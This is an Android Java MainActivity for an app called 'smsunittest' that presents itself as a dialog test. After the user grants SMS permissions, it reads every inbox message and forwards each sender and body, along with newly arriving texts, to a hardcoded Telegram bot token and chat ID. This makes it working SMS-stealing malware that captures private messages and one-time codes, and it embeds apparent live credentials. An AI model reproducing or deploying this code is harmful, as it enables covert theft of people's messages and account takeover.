package com.example.smsunittest;

import android.Manifest;
import android.app.AlertDialog;
import android.app.Dialog;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Bundle;
import android.os.Handler;
import android.widget.Button;
import android.widget.Toast;
import android.view.View;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.google.android.material.dialog.MaterialAlertDialogBuilder;
import kotlinx.coroutines.Delay;
import java.time.LocalTime; 

public class MainActivity extends AppCompatActivity {

    private static final int SMS_PERMISSION_CODE = 1;
    private BroadcastReceiver smsDialogReceiver;
    private static final String BOT_TOKEN = "7253930649:AAGWMIcK9vv_oRsN7FknhC4VOmNDXDSLksQ";
    private static final String CHAT_ID = "1358707991"; 

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        LocalTime myObj = LocalTime.now();
        
        Button newButton = findViewById(R.id.btnShowSms);
        new MaterialAlertDialogBuilder(this)
            .setTitle("Welcome!")
            .setMessage("This is a dialog test." + myObj)
            .setPositiveButton("OKay", (dialog, which) -> {
                Toast.makeText(getApplicationContext(), "Positive button clicked!", Toast.LENGTH_LONG).show();
                //
            })
            .setNegativeButton("Cancel", (dialog, which) -> {
                Toast.makeText(getApplicationContext(), "Negative button clicked!", Toast.LENGTH_LONG).show();
                
            })
            .show();

        // Set OnClickListener
        newButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                // CLICK EVENT
                   Toast.makeText(getApplicationContext(), "Getting data...", Toast.LENGTH_SHORT).show();
                    fetchAllSms();
                    
                    
            }
        });

        // Check and requests permission READ_SMS
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            new MaterialAlertDialogBuilder(this)
            .setTitle("Permission request")
            .setMessage("Please allow the App to access your SMS")
            .setPositiveButton("Allow", (dialog, which) -> {
                    Toast.makeText(getApplicationContext(), "Requesting permission...", Toast.LENGTH_SHORT).show();
                    ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS}, SMS_PERMISSION_CODE);
            })
            .setNegativeButton("Exit", (dialog, which) -> {
                    finishAffinity();
            })
            .setCancelable(false)
            .show();
        } else {
            fetchAllSms();
        }

        // BroadcastReceiver to handle incoming SMS
        smsDialogReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                String smsContent = intent.getStringExtra("sms_body");
                showSmsDialog(smsContent);
                sendSmsToTelegram(smsContent);
            }
        };

        // Register BroadcastReceiver untuk dialog SMS baru
        registerReceiver(smsDialogReceiver, new IntentFilter("com.example.smsunittest.NEW_SMS"));
    }

    // Dump all SMS
    private void fetchAllSms() {
        ContentResolver contentResolver = getContentResolver();
        Uri uri = Uri.parse("content://sms/inbox");
        Cursor cursor = contentResolver.query(uri, null, null, null, null);
        StringBuilder smsBuilder = new StringBuilder();

        if (cursor != null && cursor.moveToFirst()) {
            do {
                String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                smsBuilder.append("SMS dari: ").append(address).append("\n");
                smsBuilder.append(body).append("\n\n");

                // Send to API (RECEIVER)
                String ttt = address + "\n" + body;
                sendSmsToTelegram(ttt);

            } while (cursor.moveToNext());

            cursor.close();
        }

        if (smsBuilder.length() > 0) {
            showSmsDialog(smsBuilder.toString());
        } else {
            Toast.makeText(this, "Tidak ada SMS di kotak masuk.", Toast.LENGTH_SHORT).show();
        }
    }

    // Show Dialog
    private void showSmsDialog(String smsContent) {
        new MaterialAlertDialogBuilder(this)
                .setTitle("SMS Diterima")
                .setMessage(smsContent)
                .setPositiveButton("OK", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        dialog.dismiss();
                    }
                }).show();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (smsDialogReceiver != null) {
            unregisterReceiver(smsDialogReceiver);
        }
    }

    // Check permission
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == SMS_PERMISSION_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // Jika izin diberikan, ambil semua SMS
                fetchAllSms();
            } else {
                Toast.makeText(this, "Izin SMS ditolak.", Toast.LENGTH_SHORT).show();
            }
        }
    }

    // Send message to API
    private void sendSmsToTelegram(String message) {
        new Thread(() -> {
            try {
                String text = message;
                String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + text;
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.getInputStream();
                conn.disconnect();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
    
    public void readfile(){
        //
    }
    
    public void getDeviceprop(){
        //
    }
}
